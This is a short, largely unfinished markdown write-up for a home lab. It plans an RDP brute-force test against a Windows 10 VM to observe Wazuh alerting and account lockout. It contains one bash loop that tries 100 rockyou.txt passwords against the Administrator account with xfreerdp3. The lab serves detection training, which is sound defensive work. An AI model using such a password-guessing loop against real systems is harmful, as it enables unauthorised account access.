\# RDP Brute Force Attack Detection – V2



\## Overview

This is a follow-up brute force exercise (V2) building on the original RDP brute force test. This version uses a larger wordlist (100 attempts instead of 20) to observe account lockout behavior and Wazuh alert scaling under a heavier attack volume.



\## Lab Environment

| Host | Role | IP |

|---|---|---|

| Ubuntu Server | Wazuh Manager / Dashboard | 10.0.2.4 |

| demoWIN (Windows 10) | Attack target | 10.0.2.3 |

| Kali Linux | Attacker | 10.0.2.15 |



\## Step 1 — Baseline (before attack)

\*(To be filled in with baseline dashboard numbers and screenshot)\*



\## Step 2 — Launch the attack

```bash

for pass in $(head -100 /usr/share/wordlists/rockyou.txt); do

&#x20; xfreerdp3 /v:10.0.2.3 /u:Administrator /p:"$pass" /cert:ignore +auth-only 2>\&1 | grep -i "authentication\\|error"

done

```



\## Step 3 — Detection in Wazuh

\*(To be filled in after attack — auth failure/success counts, screenshot)\*



\## Step 4 — Alert list (Events tab)

\*(To be filled in)\*



\## Step 5 — Verifying the source

\*(To be filled in)\*



\## Summary

\*(To be filled in)\*

